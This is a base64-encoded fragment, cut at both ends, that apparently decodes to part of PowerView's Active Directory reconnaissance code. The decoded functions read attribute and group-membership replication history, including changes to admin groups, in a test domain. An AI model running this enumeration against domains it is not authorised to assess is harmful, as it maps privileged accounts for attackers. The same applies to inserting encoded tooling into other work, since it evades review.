xhYi5sb2NhbAoKUmV0dXJuIGFsbCBhdHRyaWJ1dGUgcmVwbGljYXRpb24gbWV0YWRhdGEgZm9yIGFsbCBvYmplY3RzIGluIHRoZSB0ZXN0bGFiLmxvY2FsIGRvbWFpbi4KCi5FWEFNUExFCgonUy0xLTUtMjEtODgzMjMyODIyLTI3NDEzNzY4NS00MTczMjA3OTk3LTExMDknLCdDTj1kZm0uYSxDTj1Vc2VycyxEQz10ZXN0bGFiLERDPWxvY2FsJywnZGEnLCc5NDI5OWRiMS1lM2U3LTQ4ZjktODQ1Yi0zYmZmZWY4YmVkYmInIHwgR2V0LURvbWFpbk9iamVjdEF0dHJpYnV0ZUhpc3RvcnkgLVByb3BlcnRpZXMgb2JqZWN0Q2xhc3MgfCBmdAoKT2JqZWN0RE4gICAgICBPYmplY3RHdWlkICAgIEF0dHJpYnV0ZU5hbSBMYXN0T3JpZ2luYXQgVmVyc2lvbiAgICAgIExhc3RPcmlnaW5hdAogICAgICAgICAgICAgICAgICAgICAgICAgICAgZSAgICAgICAgICAgIGluZ0NoYW5nZSAgICAgICAgICAgICAgICAgaW5nRHNhRE4KLS0tLS0tLS0gICAgICAtLS0tLS0tLS0tICAgIC0tLS0tLS0tLS0tLSAtLS0tLS0tLS0tLS0gLS0tLS0tLSAgICAgIC0tLS0tLS0tLS0tLQpDTj1kZm0uYSxDLi4uIGE2MjYzODc0LWYuLi4gb2JqZWN0Q2xhc3MgIDIwMTctMDMtMC4uLiAxICAgICAgICAgICAgQ049TlREUyBTLi4uCkNOPURBLENOPVUuLi4gNzdiNTZkZjQtZi4uLiBvYmplY3RDbGFzcyAgMjAxNy0wNC0xLi4uIDEgICAgICAgICAgICBDTj1OVERTIFMuLi4KQ049aGFybWoweS4uLiA5NDI5OWRiMS1lLi4uIG9iamVjdENsYXNzICAyMDE3LTAzLTAuLi4gMSAgICAgICAgICAgIENOPU5URFMgUy4uLgoKLkVYQU1QTEUKCkdldC1Eb21haW5PYmplY3RBdHRyaWJ1dGVIaXN0b3J5IGhhcm1qMHkgLVByb3BlcnRpZXMgdXNlckFjY291bnRDb250cm9sCgpPYmplY3RETiAgICAgICAgICAgICAgOiBDTj1oYXJtajB5LENOPVVzZXJzLERDPXRlc3RsYWIsREM9bG9jYWwKT2JqZWN0R3VpZCAgICAgICAgICAgIDogOTQyOTlkYjEtZTNlNy00OGY5LTg0NWItM2JmZmVmOGJlZGJiCkF0dHJpYnV0ZU5hbWUgICAgICAgICA6IHVzZXJBY2NvdW50Q29udHJvbApMYXN0T3JpZ2luYXRpbmdDaGFuZ2UgOiAyMDE3LTAzLTA3VDE5OjU2OjI3WgpWZXJzaW9uICAgICAgICAgICAgICAgOiA0Ckxhc3RPcmlnaW5hdGluZ0RzYUROICA6IENOPU5URFMgU2V0dGluZ3MsQ049UFJJTUFSWSxDTj1TZXJ2ZXJzLENOPURlZmF1bHQtRmlyc3QKICAgICAgICAgICAgICAgICAgICAgICAgLVNpdGUtTmFtZSxDTj1TaXRlcyxDTj1Db25maWd1cmF0aW9uLERDPXRlc3RsYWIsREM9bG9jYQogICAgICAgICAgICAgICAgICAgICAgICBsCgouT1VUUFVUUwoKUG93ZXJWaWV3LkFET2JqZWN0QXR0cmlidXRlSGlzdG9yeQoKQ3VzdG9tIFBTT2JqZWN0IHdpdGggdHJhbnNsYXRlZCByZXBsaWNhdGlvbiBtZXRhZGF0YSBmaWVsZHMuCgouTElOSwoKaHR0cHM6Ly9ibG9ncy50ZWNobmV0Lm1pY3Jvc29mdC5jb20vcGllLzIwMTQvMDgvMjUvbWV0YWRhdGEtMS13aGVuLWRpZC10aGUtZGVsZWdhdGlvbi1jaGFuZ2UtaG93LXRvLXRyYWNrLXNlY3VyaXR5LWRlc2NyaXB0b3ItbW9kaWZpY2F0aW9ucy8KIz4KCiAgICBbRGlhZ25vc3RpY3MuQ29kZUFuYWx5c2lzLlN1cHByZXNzTWVzc2FnZUF0dHJpYnV0ZSgnUFNVc2VEZWNsYXJlZFZhcnNNb3JlVGhhbkFzc2lnbm1lbnRzJywgJycpXQogICAgW091dHB1dFR5cGUoJ1Bvd2VyVmlldy5BRE9iamVjdEF0dHJpYnV0ZUhpc3RvcnknKV0KICAgIFtDbWRsZXRCaW5kaW5nKCldCiAgICBQYXJhbSgKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgVmFsdWVGcm9tUGlwZWxpbmUgPSAkVHJ1ZSwgVmFsdWVGcm9tUGlwZWxpbmVCeVByb3BlcnR5TmFtZSA9ICRUcnVlKV0KICAgICAgICBbQWxpYXMoJ0Rpc3Rpbmd1aXNoZWROYW1lJywgJ1NhbUFjY291bnROYW1lJywgJ05hbWUnLCAnTWVtYmVyRGlzdGluZ3Vpc2hlZE5hbWUnLCAnTWVtYmVyTmFtZScpXQogICAgICAgIFtTdHJpbmdbXV0KICAgICAgICAkSWRlbnRpdHksCgogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkRG9tYWluLAoKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtBbGlhcygnRmlsdGVyJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkTERBUEZpbHRlciwKCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nW11dCiAgICAgICAgJFByb3BlcnRpZXMsCgogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdBRFNQYXRoJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2VhcmNoQmFzZSwKCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbQWxpYXMoJ0RvbWFpbkNvbnRyb2xsZXInKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRTZXJ2ZXIsCgogICAgICAgIFtWYWxpZGF0ZVNldCgnQmFzZScsICdPbmVMZXZlbCcsICdTdWJ0cmVlJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2VhcmNoU2NvcGUgPSAnU3VidHJlZScsCgogICAgICAgIFtWYWxpZGF0ZVJhbmdlKDEsIDEwMDAwKV0KICAgICAgICBbSW50XQogICAgICAgICRSZXN1bHRQYWdlU2l6ZSA9IDIwMCwKCiAgICAgICAgW1ZhbGlkYXRlUmFuZ2UoMSwgMTAwMDApXQogICAgICAgIFtJbnRdCiAgICAgICAgJFNlcnZlclRpbWVMaW1pdCwKCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkVG9tYnN0b25lLAoKICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0KICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLkNyZWRlbnRpYWxBdHRyaWJ1dGUoKV0KICAgICAgICAkQ3JlZGVudGlhbCA9IFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXTo6RW1wdHksCgogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJFJhdwogICAgKQoKICAgIEJFR0lOIHsKICAgICAgICAkU2VhcmNoZXJBcmd1bWVudHMgPSBAewogICAgICAgICAgICAnUHJvcGVydGllcycgICAgPSAgICdtc2RzLXJlcGxhdHRyaWJ1dGVtZXRhZGF0YScsJ2Rpc3Rpbmd1aXNoZWRuYW1lJwogICAgICAgICAgICAnUmF3JyAgICAgICAgICAgPSAgICRUcnVlCiAgICAgICAgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0RvbWFpbiddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snRG9tYWluJ10gPSAkRG9tYWluIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydMREFQRmlsdGVyJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydMREFQRmlsdGVyJ10gPSAkTERBUEZpbHRlciB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VhcmNoQmFzZSddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snU2VhcmNoQmFzZSddID0gJFNlYXJjaEJhc2UgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlcnZlciddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snU2VydmVyJ10gPSAkU2VydmVyIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZWFyY2hTY29wZSddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snU2VhcmNoU2NvcGUnXSA9ICRTZWFyY2hTY29wZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snUmVzdWx0UGFnZVNpemUnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1Jlc3VsdFBhZ2VTaXplJ10gPSAkUmVzdWx0UGFnZVNpemUgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlcnZlclRpbWVMaW1pdCddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snU2VydmVyVGltZUxpbWl0J10gPSAkU2VydmVyVGltZUxpbWl0IH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydUb21ic3RvbmUnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1RvbWJzdG9uZSddID0gJFRvbWJzdG9uZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snRmluZE9uZSddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snRmluZE9uZSddID0gJEZpbmRPbmUgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NyZWRlbnRpYWwnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ0NyZWRlbnRpYWwnXSA9ICRDcmVkZW50aWFsIH0KCiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snUHJvcGVydGllcyddKSB7CiAgICAgICAgICAgICRQcm9wZXJ0eUZpbHRlciA9ICRQU0JvdW5kUGFyYW1ldGVyc1snUHJvcGVydGllcyddIC1Kb2luICd8JwogICAgICAgIH0KICAgICAgICBlbHNlIHsKICAgICAgICAgICAgJFByb3BlcnR5RmlsdGVyID0gJycKICAgICAgICB9CiAgICB9CgogICAgUFJPQ0VTUyB7CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snSWRlbnRpdHknXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ0lkZW50aXR5J10gPSAkSWRlbnRpdHkgfQoKICAgICAgICBHZXQtRG9tYWluT2JqZWN0IEBTZWFyY2hlckFyZ3VtZW50cyB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAgICAgJE9iamVjdEROID0gJF8uUHJvcGVydGllc1snZGlzdGluZ3Vpc2hlZG5hbWUnXVswXQogICAgICAgICAgICBGb3JFYWNoKCRYTUxOb2RlIGluICRfLlByb3BlcnRpZXNbJ21zZHMtcmVwbGF0dHJpYnV0ZW1ldGFkYXRhJ10pIHsKICAgICAgICAgICAgICAgICRUZW1wT2JqZWN0ID0gW3htbF0kWE1MTm9kZSB8IFNlbGVjdC1PYmplY3QgLUV4cGFuZFByb3BlcnR5ICdEU19SRVBMX0FUVFJfTUVUQV9EQVRBJyAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZQogICAgICAgICAgICAgICAgaWYgKCRUZW1wT2JqZWN0KSB7CiAgICAgICAgICAgICAgICAgICAgaWYgKCRUZW1wT2JqZWN0LnBzekF0dHJpYnV0ZU5hbWUgLU1hdGNoICRQcm9wZXJ0eUZpbHRlcikgewogICAgICAgICAgICAgICAgICAgICAgICAkT3V0cHV0ID0gTmV3LU9iamVjdCBQU09iamVjdAogICAgICAgICAgICAgICAgICAgICAgICAkT3V0cHV0IHwgQWRkLU1lbWJlciBOb3RlUHJvcGVydHkgJ09iamVjdEROJyAkT2JqZWN0RE4KICAgICAgICAgICAgICAgICAgICAgICAgJE91dHB1dCB8IEFkZC1NZW1iZXIgTm90ZVByb3BlcnR5ICdBdHRyaWJ1dGVOYW1lJyAkVGVtcE9iamVjdC5wc3pBdHRyaWJ1dGVOYW1lCiAgICAgICAgICAgICAgICAgICAgICAgICRPdXRwdXQgfCBBZGQtTWVtYmVyIE5vdGVQcm9wZXJ0eSAnTGFzdE9yaWdpbmF0aW5nQ2hhbmdlJyAkVGVtcE9iamVjdC5mdGltZUxhc3RPcmlnaW5hdGluZ0NoYW5nZQogICAgICAgICAgICAgICAgICAgICAgICAkT3V0cHV0IHwgQWRkLU1lbWJlciBOb3RlUHJvcGVydHkgJ1ZlcnNpb24nICRUZW1wT2JqZWN0LmR3VmVyc2lvbgogICAgICAgICAgICAgICAgICAgICAgICAkT3V0cHV0IHwgQWRkLU1lbWJlciBOb3RlUHJvcGVydHkgJ0xhc3RPcmlnaW5hdGluZ0RzYUROJyAkVGVtcE9iamVjdC5wc3pMYXN0T3JpZ2luYXRpbmdEc2FETgogICAgICAgICAgICAgICAgICAgICAgICAkT3V0cHV0LlBTT2JqZWN0LlR5cGVOYW1lcy5JbnNlcnQoMCwgJ1Bvd2VyVmlldy5BRE9iamVjdEF0dHJpYnV0ZUhpc3RvcnknKQogICAgICAgICAgICAgICAgICAgICAgICAkT3V0cHV0CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0dldC1Eb21haW5PYmplY3RBdHRyaWJ1dGVIaXN0b3J5XSBFcnJvciByZXRyaWV2aW5nICdtc2RzLXJlcGxhdHRyaWJ1dGVtZXRhZGF0YScgZm9yICckT2JqZWN0RE4nIgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQp9CgoKZnVuY3Rpb24gR2V0LURvbWFpbk9iamVjdExpbmtlZEF0dHJpYnV0ZUhpc3Rvcnkgewo8IwouU1lOT1BTSVMKClJldHVybnMgdGhlIEFjdGl2ZSBEaXJlY3RvcnkgbGlua3MgYXR0cmlidXRlIHZhbHVlIHJlcGxpY2F0aW9uIG1ldGFkYXRhIGZvciB0aGUKc3BlY2lmaWVkIG9iamVjdCwgaS5lLiBhIHBhcnNlZCB2ZXJzaW9uIG9mIHRoZSBtc2RzLXJlcGx2YWx1ZW1ldGFkYXRhIGF0dHJpYnV0ZS4KQnkgZGVmYXVsdCwgcmVwbGljYXRpb24gZGF0YSBmb3IgZXZlcnkgZG9tYWluIG9iamVjdCBpcyByZXR1cm5lZC4KCkF1dGhvcjogV2lsbCBTY2hyb2VkZXIgKEBoYXJtajB5KSAgCkxpY2Vuc2U6IEJTRCAzLUNsYXVzZSAgClJlcXVpcmVkIERlcGVuZGVuY2llczogR2V0LURvbWFpbk9iamVjdAoKLkRFU0NSSVBUSU9OCgpXcmFwcyBHZXQtRG9tYWluT2JqZWN0IHdpdGggYSBzcGVjaWZpY2F0aW9uIHRvIHJldHJpZXZlIHRoZSBwcm9wZXJ0eSAnbXNkcy1yZXBsdmFsdWVtZXRhZGF0YScuClRoaXMgaXMgdGhlIGRvbWFpbiBsaW5rZWQgYXR0cmlidXRlIHZhbHVlIHJlcGxpY2F0aW9uIG1ldGFkYXRhIGFzc29jaWF0ZWQgd2l0aCB0aGUgb2JqZWN0LiBUaGUKcmVzdWx0cyBhcmUgcGFyc2VkIGZyb20gdGhlaXIgWE1MIHN0cmluZyBmb3JtIGFuZCByZXR1cm5lZCBhcyBhIGN1c3RvbSBvYmplY3QuCgouUEFSQU1FVEVSIElkZW50aXR5CgpBIFNhbUFjY291bnROYW1lIChlLmcuIGhhcm1qMHkpLCBEaXN0aW5ndWlzaGVkTmFtZSAoZS5nLiBDTj1oYXJtajB5LENOPVVzZXJzLERDPXRlc3RsYWIsREM9bG9jYWwpLApTSUQgKGUuZy4gUy0xLTUtMjEtODkwMTcxODU5LTM0MzM4MDkyNzktMzM2NjE5Njc1My0xMTA4KSwgb3IgR1VJRCAoZS5nLiA0YzQzNWRkNy1kYzU4LTRiMTQtOWE1ZS0xZmRiMGU4MGQyMDEpLgpXaWxkY2FyZHMgYWNjZXB0ZWQuCgouUEFSQU1FVEVSIERvbWFpbgoKU3BlY2lmaWVzIHRoZSBkb21haW4gdG8gdXNlIGZvciB0aGUgcXVlcnksIGRlZmF1bHRzIHRvIHRoZSBjdXJyZW50IGRvbWFpbi4KCi5QQVJBTUVURVIgTERBUEZpbHRlcgoKU3BlY2lmaWVzIGFuIExEQVAgcXVlcnkgc3RyaW5nIHRoYXQgaXMgdXNlZCB0byBmaWx0ZXIgQWN0aXZlIERpcmVjdG9yeSBvYmplY3RzLgoKLlBBUkFNRVRFUiBQcm9wZXJ0aWVzCgpPbmx5IHJldHVybiByZXBsaWNhdGlvbiBtZXRhZGF0YSBvbiB0aGUgc3BlY2lmaWVkIHByb3BlcnR5IG5hbWVzLgoKLlBBUkFNRVRFUiBTZWFyY2hCYXNlCgpUaGUgTERBUCBzb3VyY2UgdG8gc2VhcmNoIHRocm91Z2gsIGUuZy4gIkxEQVA6Ly9PVT1zZWNyZXQsREM9dGVzdGxhYixEQz1sb2NhbCIKVXNlZnVsIGZvciBPVSBxdWVyaWVzLgoKLlBBUkFNRVRFUiBTZXJ2ZXIKClNwZWNpZmllcyBhbiBBY3RpdmUgRGlyZWN0b3J5IHNlcnZlciAoZG9tYWluIGNvbnRyb2xsZXIpIHRvIGJpbmQgdG8uCgouUEFSQU1FVEVSIFNlYXJjaFNjb3BlCgpTcGVjaWZpZXMgdGhlIHNjb3BlIHRvIHNlYXJjaCB1bmRlciwgQmFzZS9PbmVMZXZlbC9TdWJ0cmVlIChkZWZhdWx0IG9mIFN1YnRyZWUpLgoKLlBBUkFNRVRFUiBSZXN1bHRQYWdlU2l6ZQoKU3BlY2lmaWVzIHRoZSBQYWdlU2l6ZSB0byBzZXQgZm9yIHRoZSBMREFQIHNlYXJjaGVyIG9iamVjdC4KCi5QQVJBTUVURVIgU2VydmVyVGltZUxpbWl0CgpTcGVjaWZpZXMgdGhlIG1heGltdW0gYW1vdW50IG9mIHRpbWUgdGhlIHNlcnZlciBzcGVuZHMgc2VhcmNoaW5nLiBEZWZhdWx0IG9mIDEyMCBzZWNvbmRzLgoKLlBBUkFNRVRFUiBUb21ic3RvbmUKClN3aXRjaC4gU3BlY2lmaWVzIHRoYXQgdGhlIHNlYXJjaGVyIHNob3VsZCBhbHNvIHJldHVybiBkZWxldGVkL3RvbWJzdG9uZWQgb2JqZWN0cy4KCi5QQVJBTUVURVIgQ3JlZGVudGlhbAoKQSBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0gb2JqZWN0IG9mIGFsdGVybmF0ZSBjcmVkZW50aWFscwpmb3IgY29ubmVjdGlvbiB0byB0aGUgdGFyZ2V0IGRvbWFpbi4KCi5FWEFNUExFCgpHZXQtRG9tYWluT2JqZWN0TGlua2VkQXR0cmlidXRlSGlzdG9yeSB8IEdyb3VwLU9iamVjdCBPYmplY3RETiB8IGZ0IC1hCgpDb3VudCBOYW1lCi0tLS0tIC0tLS0KICAgIDQgQ049QWRtaW5pc3RyYXRvcnMsQ049QnVpbHRpbixEQz10ZXN0bGFiLERDPWxvY2FsCiAgICA0IENOPVVzZXJzLENOPUJ1aWx0aW4sREM9dGVzdGxhYixEQz1sb2NhbAogICAgMiBDTj1HdWVzdHMsQ049QnVpbHRpbixEQz10ZXN0bGFiLERDPWxvY2FsCiAgICAxIENOPUlJU19JVVNSUyxDTj1CdWlsdGluLERDPXRlc3RsYWIsREM9bG9jYWwKICAgIDEgQ049U2NoZW1hIEFkbWlucyxDTj1Vc2VycyxEQz10ZXN0bGFiLERDPWxvY2FsCiAgICAxIENOPUVudGVycHJpc2UgQWRtaW5zLENOPVVzZXJzLERDPXRlc3RsYWIsREM9bG9jYWwKICAgIDQgQ049RG9tYWluIEFkbWlucyxDTj1Vc2VycyxEQz10ZXN0bGFiLERDPWxvY2FsCiAgICAxIENOPUdyb3VwIFBvbGljeSBDcmVhdG9yIE93bmVycyxDTj1Vc2VycyxEQz10ZXN0bGFiLERDPWxvY2FsCiAgICAxIENOPVByZS1XaW5kb3dzIDIwMDAgQ29tcGF0aWJsZSBBY2Nlc3MsQ049QnVpbHRpbixEQz10ZXN0bGFiLERDPWxvY2FsCiAgICAxIENOPVdpbmRvd3MgQXV0aG9yaXphdGlvbiBBY2Nlc3MgR3JvdXAsQ049QnVpbHRpbixEQz10ZXN0bGFiLERDPWxvY2FsCiAgICA4IENOPURlbmllZCBST0RDIFBhc3N3b3JkIFJlcGxpY2F0aW9uIEdyb3VwLENOPVVzZXJzLERDPXRlc3RsYWIsREM9bG9jYWwKICAgIDIgQ049UFJJTUFSWSxDTj1Ub3BvbG9neSxDTj1Eb21haW4gU3lzdGVtIFZvbHVtZSxDTj1ERlNSLUdsb2JhbFNldHRpbmdzLC4uLgogICAgMSBDTj1Eb21haW4gU3lzdGVtIFZvbHVtZSxDTj1ERlNSLUxvY2FsU2V0dGluZ3MsQ049UFJJTUFSWSxPVT1Eb21haW4gQ29uLi4uCiAgICAxIENOPVNlcnZlckFkbWlucyxDTj1Vc2VycyxEQz10ZXN0bGFiLERDPWxvY2FsCiAgICAzIENOPURvbWFpbkxvY2FsR3JvdXAsQ049VXNlcnMsREM9dGVzdGxhYixEQz1sb2NhbAoKCi5FWEFNUExFCgonUy0xLTUtMjEtODgzMjMyODIyLTI3NDEzNzY4NS00MTczMjA3OTk3LTUxOScsJ2FmOTRmNDllLTYxYTUtNGY3ZC1hMTdjLWQ4MGZiMTZhNTIyMCcgfCBHZXQtRG9tYWluT2JqZWN0TGlua2VkQXR0cmlidXRlSGlzdG9yeQoKT2JqZWN0RE4gICAgICAgICAgICAgIDogQ049RW50ZXJwcmlzZSBBZG1pbnMsQ049VXNlcnMsREM9dGVzdGxhYixEQz1sb2NhbApPYmplY3RHdWlkICAgICAgICAgICAgOiA5NGU3ODJjMS0xNmExLTQwMGItYTdkMC0xMTI2MDM4YzYzODcKQXR0cmlidXRlTmFtZSAgICAgICAgIDogbWVtYmVyCkF0dHJpYnV0ZVZhbHVlICAgICAgICA6IENOPUFkbWluaXN0cmF0b3IsQ049VXNlcnMsREM9dGVzdGxhYixEQz1sb2NhbApUaW1lRGVsZXRlZCAgICAgICAgICAgOiAyMDE3LTAzLTA2VDAwOjQ4OjI5WgpUaW1lQ3JlYXRlZCAgICAgICAgICAgOiAyMDE3LTAzLTA2VDAwOjQ4OjI5WgpMYXN0T3JpZ2luYXRpbmdDaGFuZ2UgOiAyMDE3LTAzLTA2VDAwOjQ4OjI5WgpWZXJzaW9uICAgICAgICAgICAgICAgOiAxCkxhc3RPcmlnaW5hdGluZ0RzYUROICA6IENOPU5URFMgU2V0dGluZ3MsQ049UFJJTUFSWSxDTj1TZXJ2ZXJzLENOPURlZmF1bHQtRmlyc3QKICAgICAgICAgICAgICAgICAgICAgICAgLVNpdGUtTmFtZSxDTj1TaXRlcyxDTj1Db25maWd1cmF0aW9uLERDPXRlc3RsYWIsREM9bG9jYQogICAgICAgICAgICAgICAgICAgICAgICBsCgpPYmplY3RETiAgICAgICAgICAgICAgOiBDTj1Eb21haW4gQWRtaW5zLENOPVVzZXJzLERDPXRlc3RsYWIsREM9bG9jYWwKT2JqZWN0R3VpZCAgICAgICAgICAgIDogYWY5NGY0OWUtNjFhNS00ZjdkLWExN2MtZDgwZmIxNmE1MjIwCkF0dHJpYnV0ZU5hbWUgICAgICAgICA6IG1lbWJlcgpBdHRyaWJ1dGVWYWx1ZSAgICAgICAgOiBDTj1kZm0sQ049VXNlcnMsREM9dGVzdGxhYixEQz1sb2NhbApUaW1lRGVsZXRlZCAgICAgICAgICAgOiAyMDE3LTA2LTEzVDIyOjIwOjAyWgpUaW1lQ3JlYXRlZCAgICAgICAgICAgOiAyMDE3LTA2LTEzVDIyOjIwOjAyWgpMYXN0T3JpZ2luYXRpbmdDaGFuZ2UgOiAyMDE3LTA2LTEzVDIyOjIwOjIyWgpWZXJzaW9uICAgICAgICAgICAgICAgOiAyCkxhc3RPcmlnaW5hdGluZ0RzYUROICA6IENOPU5URFMgU2V0dGluZ3MsQ049UFJJTUFSWSxDTj1TZXJ2ZXJzLENOPURlZmF1bHQtRmlyc3QKICAgICAgICAgICAgICAgICAgICAgICAgLVNpdGUtTmFtZSxDTj1TaXRlcyxDTj1Db25maWd1cmF0aW9uLERDPXRlc3RsYWIsREM9bG9jYQogICAgICAgICAgICAgICAgICAgICAgICBsCgpPYmplY3RETiAgICAgICAgICAgICAgOiBDTj1Eb21haW4gQWRtaW5zLENOPVVzZXJzLERDPXRlc3RsYWIsREM9bG9jYWwKT2JqZWN0R3VpZCAgICAgICAgICAgIDogYWY5NGY0OWUtNjFhNS00ZjdkLWExN2MtZDgwZmIxNmE1MjIwCkF0dHJpYnV0ZU5hbWUgICAgICAgICA6IG1lbWJlcgpBdHRyaWJ1dGVWYWx1ZSAgICAgICAgOiBDTj1BZG1pbmlzdHJhdG9yLENOPVVzZXJzLERDPXRlc3RsYWIsREM9bG9jYWwKVGltZURlbGV0ZWQgICAgICAgICAgIDogMjAxNy0wMy0wNlQwMDo0ODoyOVoKVGltZUNyZWF0ZWQgICAgICAgICAgIDogMjAxNy0wMy0wNlQwMDo0ODoyOVoKTGFzdE9yaWdpbmF0aW5nQ2hhbmdlIDogMjAxNy0wMy0wNlQwMDo0ODoyOVoKVmVyc2lvbiAgICAgICAgICAgICAgIDogMQpMYXN0T3JpZ2luYXRpbmdEc2FETiAgOiBDTj1OVERTIFNldHRpbmdzLENOPVBSSU1BUlksQ049U2VydmVycyxDTj1EZWZhdWx0LUZpcnN0CiAgICAgICAgICAgICAgICAgICAgICAgIC1TaXRlLU5hbWUsQ049U2l0ZXMsQ049Q29uZmlndXJhdGlvbixEQz10ZXN0bGFiLERDPWxvY2EKICAgICAgICAgICAgICAgICAgICAgICAgbAoKLkVYQU1QTEUKCkdldC1Eb21haW5PYmplY3RMaW5rZWRBdHRyaWJ1dGVIaXN0b3J5IFNlcnZlckFkbWlucyAtRG9tYWluIHRlc3RsYWIubG9jYWwKCk9iamVjdEROICAgICAgICAgICAgICA6IENOPVNlcnZlckFkbWlucyxDTj1Vc2VycyxEQz10ZXN0bGFiLERDPWxvY2FsCk9iamVjdEd1aWQgICAgICAgICAgICA6IDYwM2I0NmFkLTU1NWMtNDliMy04NzQ1LWMwNzE4ZmViZWZjMgpBdHRyaWJ1dGVOYW1lICAgICAgICAgOiBtZW1iZXIKQXR0cmlidXRlVmFsdWUgICAgICAgIDogQ049amFzb24uYSxDTj1Vc2VycyxEQz1kZXYsREM9dGVzdGxhYixEQz1sb2NhbApUaW1lRGVsZXRlZCAgICAgICAgICAgOiAyMDE3LTA0LTEwVDIyOjE3OjE5WgpUaW1lQ3JlYXRlZCAgICAgICAgICAgOiAyMDE3LTA0LTEwVDIyOjE3OjE5WgpMYXN0T3JpZ2luYXRpbmdDaGFuZ2UgOiAyMDE3LTA0LTEwVDIyOjE3OjE5WgpWZXJzaW9uICAgICAgICAgICAgICAgOiAxCkxhc3RPcmlnaW5hdGluZ0RzYUROICA6IENOPU5URFMgU2V0dGluZ3MsQ049UFJJTUFSWSxDTj1TZXJ2ZXJzLENOPURlZmF1bHQtRmlyc3QKICAgICAgICAgICAgICAgICAgICAgICAgLVNpdGUtTmFtZSxDTj1TaXRlcyxDTj1Db25maWd1cmF0aW9uLERDPXRlc3RsYWIsREM9bG9jYQogICAgICAgICAgICAgICAgICAgICAgICBsCgouT1VUUFVUUwoKUG93ZXJWaWV3LkFET2JqZWN0TGlua2VkQXR0cmlidXRlSGlzdG9yeQoKQ3VzdG9tIFBTT2JqZWN0IHdpdGggdHJhbnNsYXRlZCByZXBsaWNhdGlvbiBtZXRhZGF0YSBmaWVsZHMuCgouTElOSwoKaHR0cHM6Ly9ibG9ncy50ZWNobmV0Lm1pY3Jvc29mdC5jb20vcGllLzIwMTQvMDgvMjUvbWV0YWRhdGEtMi10aGUtZXBoZW1lcmFsLWFkbWluLW9yLWhvdy10by10cmFjay10aGUtZ3JvdXAtbWVtYmVyc2hpcC8KIz4KCiAgICBbRGlhZ25vc3RpY3MuQ29kZUFuYWx5c2lzLlN1cHByZXNzTWVzc2FnZUF0dHJpYnV0ZSgnUFNVc2VEZWNsYXJlZFZhcnNNb3JlVGhhbkFzc2lnbm1lbnRzJywgJycpXQogICAgW091dHB1dFR5cGUoJ1Bvd2VyVmlldy5BRE9iamVjdExpbmtlZEF0dHJpYnV0ZUhpc3RvcnknKV0KICAgIFtDbWRsZXRCaW5kaW5nKCldCiAgICBQYXJhbSgKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgVmFsdWVGcm9tUGlwZWxpbmUgPSAkVHJ1ZSwgVmFsdWVGcm9tUGlwZWxpbmVCeVByb3BlcnR5TmFtZSA9ICRUcnVlKV0KICAgICAgICBbQWxpYXMoJ0Rpc3Rpbmd1aXNoZWROYW1lJywgJ1NhbUFjY291bnROYW1lJywgJ05hbWUnLCAnTWVtYmVyRGlzdGluZ3Vpc2hlZE5hbWUnLCAnTWVtYmVyTmFtZScpXQogICAgICAgIFtTdHJpbmdbXV0KICAgICAgICAkSWRlbnRpdHksCgogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ10KICAgICAgI